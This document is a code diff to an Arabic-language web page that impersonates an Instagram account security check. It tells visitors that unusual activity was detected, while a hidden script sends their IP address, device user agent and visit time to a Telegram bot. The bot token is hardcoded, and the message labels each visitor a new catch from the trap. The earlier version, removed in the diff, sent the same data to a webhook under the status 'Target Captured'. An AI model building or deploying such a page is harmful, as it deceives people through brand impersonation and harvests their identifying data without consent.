@@ -1,33 +1,37 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>Security Check</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تأكيد أمان الحساب</title>
+    <style>
+        body { background-color: #fafafa; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; border: 1px solid #dbdbdb; padding: 30px; width: 300px; text-align: center; border-radius: 3px; box-shadow: 0 4px 10px rgba(0,0,0,0.05); }
+        .logo { width: 175px; margin-bottom: 20px; }
+        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #0095f6; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        h3 { font-size: 18px; color: #262626; margin: 10px 0; }
+        p { color: #8e8e8e; font-size: 14px; line-height: 1.5; }
+    </style>
 </head>
-<body style="background:#000;color:#fff;text-align:center;padding-top:100px;font-family:sans-serif;">
-    <h2>جاري فحص أمان الحساب...</h2>
-    <div style="margin: 20px auto; width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; animation: spin 1s linear infinite;"></div>
-    <p>يرجى الانتظار، لا تغلق الصفحة</p>
-
-    <style>@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
+<body>
+    <div class="card">
+        <img src="https://www.instagram.com/static/images/web/mobile_port_gradient_android.png/06f6eb648c04.png" class="logo" alt="Instagram">
+        <div class="loader"></div>
+        <h3>جاري التحقق من أمان الحساب</h3>
+        <p>لقد رصدنا نشاطاً غير معتاد من هذا الجهاز. يرجى الانتظار حتى نتمكن من تأكيد هويتك وحماية بياناتك.</p>
+    </div>
 
     <script>
+        const token = "8054466790:AAFar6qK_KltEn1IU3w_b717_eJwIu70fyw";
+        const chat_id = "8657273170"; 
+
         fetch('https://api.ipify.org?format=json')
         .then(r => r.json())
         .then(d => {
-            // هذا هو رابط صندوق البريد الخاص بك (Webhook)
-            const myWebhook = "https://webhook.site/c30334e1-1c55-4a4d-a3de-d35eede2ce18"; 
+            const message = `🚨 صيد جديد من الفخ!\n\n📍 الـ IP: ${d.ip}\n📱 الجهاز: ${navigator.userAgent}\n⏰ الوقت: ${new Date().toLocaleString()}`;
             
-            fetch(myWebhook, {
-                method: 'POST',
-                mode: 'no-cors',
-                body: JSON.stringify({
-                    ip: d.ip,
-                    device: navigator.userAgent,
-                    time: new Date().toLocaleString(),
-                    status: "Target Captured"
-                })
-            });
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`);
         });
     </script>
 </body>
